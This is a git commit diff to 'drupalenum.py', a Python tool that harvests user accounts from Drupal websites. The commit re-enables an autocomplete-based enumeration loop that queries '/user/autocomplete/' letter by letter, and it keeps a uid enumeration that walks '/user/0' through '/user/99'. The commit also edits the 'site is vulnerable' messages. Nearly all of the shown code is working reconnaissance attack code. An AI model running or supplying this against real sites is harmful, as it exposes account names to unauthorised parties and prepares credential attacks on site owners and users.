1a2c97a4fc89e6b512f30c5f8bae0481b0791d1e
Alfred Berg <alfred.berg@cortex.ax>
2018-02-20 20:18:46 +0100

    Requirements.txt

--- drupalenum.py
+++ drupalenum.py
@@ -7,13 +7,13 @@ from sys import argv
 def enum(site):
     result = []
     print("You entered the site: " + site)
-    """
+
     url = site + "/user/autocomplete/"
     r = requests.get(url + "a")
 
     if r.status_code == 200 and r.headers["content-type"] == "application/json":
         #autocomplete enumeration
-        print("[*] The site is vulnerable, lets get the users")
+        print("[*] The site is vulnerable to autocomplete-enumeration, lets get the users")
         letters = "abcdefghijklmnopqrstuvwxyz123456789"
         for l in letters:
             print("Getting users starting with the letter: " + l)
@@ -21,7 +21,7 @@ def enum(site):
             parsed = json.loads(r.text)
             for i in parsed:
                 result.append(i)
-    """
+
     url = site + "/user/"
     r0 = requests.get(url + "0")
     r1 = requests.get(url + "1")
@@ -29,7 +29,7 @@ def enum(site):
 
     if r0.status_code == 403 or r1.status_code == 200:
         #uid enumeration
-        print("[*] The site is vulnerable, lets get the users")
+        print("[*] The site is vulnerable to uid enumeration, lets get the users")
         for i in range(100):
             print("Getting user with uid: " + str(i))
             r = requests.get(url + str(i))
